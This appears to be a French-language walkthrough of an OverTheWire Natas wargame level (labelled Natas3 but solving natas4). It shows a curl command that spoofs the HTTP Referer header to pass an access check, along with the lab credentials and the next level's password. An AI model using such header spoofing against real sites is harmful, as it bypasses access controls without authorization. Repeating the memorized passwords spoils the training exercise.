## Over-The-Wire -writeup-
### Natas3 (http://natas3.natas.labs.overthewire.org/)

---
#### Etape 1

"Accès refusé, vous visitez le site depuis "..", et les utilisateurs authorisés doivent venir depuis "http://natas5.natas.labs.overthewire.org/"
On va donc **changer notre referer**, une en-tête de requette HTTP qui informe les sites de la provenance des utilisateurs (d'où ils viennent, de quel lien), par le lien demandé.

Je vais utiliser une commande **cUrl** qui va se connecter à la page en changeant le *referer* pour moi:

*Structure de la commande pour se connecter à la page: **curl -u username:password http://target-address/**
Ici cUrl renvoie la même erreur que sur le navigateur, puisque le referer n'a pas été changé. On s'est juste identifié.

Structure de la command pour changer de referer: **curl --referer http:/referer-adress/ http://target-address**
Ici cUrl envoie une requête en informant http://target-address/ que l'on provient de http://referer-address/*

**Fusionnons les deux**:
> curl -u username:password http://target-address/ --referer http://referer-address/ http://target-address/

Dans notre cas, la commande exacte est:
> curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/

---
cUrl renvoie :
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

---
Mot de passe: **iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**
